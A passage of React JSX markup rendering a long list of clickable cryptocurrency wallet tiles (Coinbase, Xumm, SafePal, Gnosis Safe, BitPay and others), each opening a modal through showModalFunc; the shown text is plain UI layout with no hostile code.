        {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Coinbase</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={coinbase}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Xumm')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
         {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Xumm</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={xumm}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Alice')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
          {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Alice</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={alice}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Coinomi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Coinomi</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={coinomi}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('WalletConnect')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Wallet Connect</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={wallet_connect}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Kaspa')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Kaspa</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={kaspa}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Chainge')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Chainge</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={chainge}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SafePal')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">SafePal</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={safepal}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SlingShot')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Slingshot Wallet</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={slingshot}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Blockchain')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Blockchain</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={blockchain}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Lobstr')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Lobstr Wallet</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={lobstr}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Yoroi')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Yoroi</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={yoroi}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Edge')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Edge</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={edge}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Solar')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Solar</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={solar}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('PeraAlgo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
              <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Pera Algo Wallet</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={pera_algo}
                alt="jrr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SenderWallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">

            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Sender Wallet</span>
              </div>
            </div>
            </div>

            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={senderwallet}
                alt="sender wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('XcelPay')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">

            <div  className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Xcel Pay Wallet</span>
              </div>
            </div>
            </div>

            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={xcel_pay}
                alt="xcel pay wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Anchor')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">

            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Anchor Wallet</span>
              </div>
            </div>
            </div>

            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={anchor}
                alt="xcel pay wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Onto')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">ONTO</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={onto}
                alt="xcel pay wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Rainbow')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Rainbow</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={rainbow}
                alt="Rainbow wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Argent')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Argent</span>
              </div>
            </div>
            </div>
            <div className="shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={argent}
                alt="Rainbow wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Cybavo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Cybavo</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={cybavo}
                alt="Rainbow wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('GrindPlus')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">GridPlus</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={grindplus}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Nash')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Nash</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={nash}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('ImToken')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">ImToken</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={imtoken}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Pillar')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Pillar</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={pillar}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Crypto')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Cryto.com | Defi Wallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={crypto}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Gnosis')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Gnosis Safe Multisig</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={gnosis}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Curve Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">Curve Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={curve}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('TokenPocket')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">TokenPocket</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tokenpocket}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MathWallet')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className="text-sm font-semibold leading-6 text-gray-900">MathWallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={math}
                alt="GridPlus wallet"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('BitPay')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
